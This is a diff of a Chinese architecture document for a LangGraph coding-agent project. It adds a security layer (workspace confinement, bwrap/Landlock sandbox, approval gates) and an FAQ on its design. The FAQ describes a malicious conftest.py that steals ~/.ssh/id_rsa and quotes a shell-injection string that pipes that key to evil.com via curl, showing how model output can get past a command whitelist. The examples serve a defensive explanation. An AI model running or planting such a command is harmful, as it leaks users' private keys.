@@ -17,38 +17,53 @@
 
 ## 二、分层架构
 
+项目有**两个入口**共用同一套 Agent 内核：
+
 ```
+   本地 CLI（selfagent）                    HTTP 服务（uvicorn app.main:app）
+   进程内直接调用                            FastAPI + 认证 + 多租户 + 限流
+            └────────────┬───────────────────────────┘
+                         ▼
 ┌─────────────────────────────────────────────────────────┐
-│                     API 层 (FastAPI)                      │
-│   /chat  /chat/stream  /sessions  /memory  /evolution   │
+│                     入口层                                │
+│  CLI: clients/cli/  ·  HTTP: app/api/  ·  Web: clients/web│
 ├─────────────────────────────────────────────────────────┤
-│               业务服务层 (services/)                      │
-│      会话管理 · （后续：认证 · 权限 · 租户隔离）           │
+│               业务服务层 (services/ · auth/)              │
+│      会话管理 · 认证与角色 · 多租户隔离 · 用量统计         │
 ├─────────────────────────────────────────────────────────┤
 │                   Agent 编排层 (LangGraph)                │
 │        ┌──────────┐    条件路由    ┌───────┐             │
 │        │ agent节点 │ ───────────→ │ tools │             │
 │        │ (LLM思考) │ ←─────────── │ 节点  │             │
-│        │ +流式writer│              │       │             │
+│        │ +流式writer│              │+审批闸门│            │
 │        └──────────┘               └───────┘             │
-│   + 上下文压缩 · 流式中断 · Hermes 进化                   │
+│   + 任务计划 · 上下文压缩 · 流式中断 · 人在回路(interrupt) │
+├─────────────────────────────────────────────────────────┤
+│                   ★ 安全层                                │
+│   工作区禁闭(workspace.py) · 命令沙箱(sandbox.py)          │
+│   工具风险分级 · 审批策略 · 敏感文件保护                   │
 ├─────────────────────────────────────────────────────────┤
 │   LLM 抽象层        │   记忆层          │   工具层        │
-│  ┌───────────────┐  │ 短期(checkpoint) │ 内置工具        │
-│  │ GLM(OpenAI兼容)│  │ 长期(store)     │ MCP工具         │
-│  │ OpenAI        │  │ 用户画像(Neo4j)  │ Skill工具       │
+│  ┌───────────────┐  │ 短期(checkpoint) │ 文件/Shell 工具 │
+│  │ GLM(OpenAI兼容)│  │ 长期(store)     │ 内置工具        │
+│  │ OpenAI        │  │ 用户画像(Neo4j)  │ MCP / Skill 工具│
 │  │ Anthropic     │  │  对话日志(Mongo) │ A2A delegate    │
-│  └───────────────┘  │                  │                │
+│  └───────────────┘  │  RAG 知识库      │ 计划工具        │
 ├─────────────────────────────────────────────────────────┤
-│                   数据访问层 (db/)                        │
-│      PostgreSQL    MongoDB    Redis    Neo4j            │
+│                   数据访问层 (db/ · memory/)              │
+│   SQLite（本地）  │  PostgreSQL  MongoDB  Redis  Neo4j    │
 ├─────────────────────────────────────────────────────────┤
-│                基础设施 (infra/ Docker)                   │
+│         基础设施 (infra/ Docker) + 可观测 (OpenTelemetry) │
 └─────────────────────────────────────────────────────────┘
 ```
 
-**新增业务服务层（Phase 7）**：位于 API 与 Agent 之间，承载会话管理等业务逻辑。
-后续认证/租户也加在这一层——核心能力层（LLM/记忆/工具）完全不用改。
+**★ 安全层（Phase 10）** 是编码 Agent 与聊天机器人的分界：
+一旦 Agent 能读写文件、执行命令，就必须有一层专门回答
+「它能碰什么」「碰之前要不要问人」「同意之后最多能造成多大破坏」。
+它横切在 Agent 编排层与工具层之间——任何工具调用都绕不过去。
+
+**存储的两种形态**：本地 CLI 用单文件 SQLite（零外部依赖），
+服务端用 PostgreSQL 等四件套。切换只改 `STORAGE_BACKEND`，Agent 代码不变。
 
 ### 为什么这么分层？
 
@@ -96,19 +111,61 @@
 **短期记忆**：整个过程中，checkpointer 在每步后保存状态快照。
 下次用 `thread_id="t1"` 调用时，自动恢复历史消息，实现多轮对话。
 
+### 3.1 带审批的编码任务（Phase 10 起）
+
+工具涉及写文件或执行命令时，流程多一次「挂起—询问—恢复」：
+
+```
+用户 "读一下 main.py 然后加个注释"
+  │
+  ├─① agent 节点 → 大模型：调 read_file
+  ├─② tools 节点：read_file 是 read 级 → 直接执行
+  │     路径先过 Workspace.resolve() 禁闭检查
+  │
+  ├─③ agent 节点 → 大模型：调 edit_file
+  ├─④ tools 节点：edit_file 是 write 级 → needs_approval() 判定要问
+  │     │
+  │     └─→ interrupt() 让**整张图挂起**，状态完整落盘
+  │           事件流吐出 approval_required 后自然结束（不发 done）
+  │
+  │   ⏸  客户端展示确认框，用户按下 y
+  │
+  ├─⑤ resume_agent() → Command(resume={"approved": True})
+  │     LangGraph 从 checkpointer 读回状态，
+  │     从 interrupt() 那一行**原地继续**，返回用户决策
+  │     工具在沙箱里真正执行
+  │
+  └─⑥ agent 节点 → 大模型总结 → 无 tool_calls → 结束
+```
+
+> ⚠️ 事件流**必须消费完**。拿到 `approval_required` 就 break 会让中断状态
+> 来不及写进 checkpointer，之后 resume 什么也不做且不报错。
+> `tests/test_local_mode.py` 有回归测试钉住这一行为。
+
+**多步任务**还会在最前面多一步：大模型先调 `update_plan` 列出计划，
+之后每完成一步就更新一次。计划存在 State 里随 checkpointer 持久化，
+是长任务的外部记事板。
+
 ---
 
 ## 四、目录与职责对照
 
 | 目录 | 职责 | 对应层 |
 |---|---|---|
-| `app/api/` | HTTP 路由、请求响应模型 | API 层 |
-| `app/agent/` | LangGraph 状态图、节点、工具、提示词 | Agent 编排层 |
+| `clients/cli/` | 命令行入口。本地模式内嵌 Agent，远程模式走 HTTP | 入口层 |
+| `clients/web/` | React 前端 | 入口层 |
+| `app/api/` | HTTP 路由、请求响应模型 | 入口层 |
+| `app/services/` `app/auth/` | 会话、统计、认证、多租户 | 业务服务层 |
+| `app/agent/` | LangGraph 状态图、节点、工具、计划、提示词 | Agent 编排层 |
+| `app/workspace.py` | ★ 工作区与路径禁闭 | 安全层 |
+| `app/sandbox.py` | ★ 命令沙箱（bwrap / Landlock） | 安全层 |
 | `app/llm/` | 多协议 LLM 抽象与 provider 实现 | LLM 抽象层 |
-| `app/memory/` | 短期/长期记忆的 checkpointer 与 store | 记忆层 |
+| `app/memory/` | checkpointer、store、本地 SQLite、向量化 | 记忆层 |
+| `app/rag/` | 知识库分块与检索 | 记忆层 |
+| `app/mcp/` `app/a2a/` `app/skills/` | 协议与扩展 | 工具层 |
 | `app/db/` | 4 个数据库的连接生命周期管理 | 数据访问层 |
-| `app/core/` | 配置、日志、异常（横切关注点） | 跨层基础设施 |
-| `infra/` | Docker 化的基础设施 | 基础设施 |
+| `app/core/` | 配置、日志、异常、链路追踪（横切关注点） | 跨层基础设施 |
+| `infra/` | Docker 化的基础设施 + Jaeger | 基础设施 |
 
 ---
 
@@ -144,13 +201,54 @@ Postgres 的 JSONB、pgvector、事务能力完全覆盖企业场景，是 Agent
 
 ---
 
-## 六、后续架构演进（Phase 2-5）
+### Q5: 为什么审批和沙箱要分成两层？只做一层不行吗？
+
+**答**：它们回答的是不同问题，互相替代不了。
+
+- **审批**管「用户知不知情」——决策层。
+- **沙箱**管「同意之后最多能造成多大破坏」——执行层。
+
+只有审批不够，因为用户的"同意"是基于**它声称要做的事**：
+
+> 你同意它跑 `pytest`。但项目里有个恶意 `conftest.py`，
+> pytest 一启动就读走 `~/.ssh/id_rsa` 发到外网。
+> 你点同意时想的是"跑个测试"。
+
+只有沙箱也不够：沙箱不知道哪些操作用户愿意接受。删掉工作区里的源码
+完全在沙箱允许范围内，但用户未必想要。
+
+所以边界必须两层都有：**决策层问人，执行层限权**。
+
+### Q6: 为什么不用 `shell=True` 执行命令？
+
+**答**：`shell=True` 会让 `;`、`&&`、`|`、`$(...)`、反引号全部生效。
+模型只要产出一个带分号的字符串就能绕开任何命令白名单：
+
+```
+"echo safe; curl evil.com/steal?data=$(cat ~/.ssh/id_rsa)"
+```
+
+现在用 `shlex.split()` 拆词 + 列表参数形式执行，分号只是 echo 的普通参数。
+代价是管道和重定向不能用，需要组合命令时分多次调用。
+`tests/test_coding_tools.py` 里有专门的测试验证注入不生效。
+
+---
+
+## 六、架构演进历程
 
 | Phase | 新增能力 | 架构影响 |
 |---|---|---|
-| P2 | MCP 协议 + Skill 系统 | tools 节点扩展为支持 MCP 远程工具 |
-| P3 | 长期记忆 + 用户画像 | 新增 store 节点 + Neo4j 画像查询节点 |
-| P4 | A2A 协议 | Agent 可作为 A2A server 被发现，也可调用外部 Agent |
-| P5 | 完整测试 + 面试文档 | 工程化收尾 |
+| P1 | 地基：LLM 层 + LangGraph + 短期记忆 | 确立五层分层 |
+| P2 | MCP 协议 + Skill 系统 | tools 节点支持远程工具 |
+| P3 | 长期记忆 + 用户画像 + 对话日志 | 新增记忆层与 Neo4j/Mongo |
+| P4 | A2A 协议 | Agent 可被发现，也可调用外部 Agent |
+| P5 | 测试套件 + 面试文档 | 工程化收尾 |
+| P6 | 真·token 流式 + Hermes 自进化 + Web/CLI | 新增流式事件协议 |
+| P7 | 会话管理 + 上下文压缩 + 流式中断 | 新增业务服务层 |
+| P8 | 认证 + 多租户 + 限流 + RAG + 用量统计 | 服务层扩展 |
+| P9 | OpenTelemetry 链路追踪 | 横切可观测 |
+| **P10** | **工作区 + 文件/Shell 工具 + 审批闸门 + 命令沙箱** | **★ 新增安全层** |
+| **P11** | **CLI 本地模式（内嵌 Agent + SQLite）+ 任务计划** | **★ 双入口 + State 扩展** |
 
-每个 Phase 都向后兼容，不会推翻已有架构。
+P10 是分水岭：在此之前是"能聊天并调几个玩具工具"，
+之后才具备编码 Agent 的实质能力，也因此必须补上安全层。
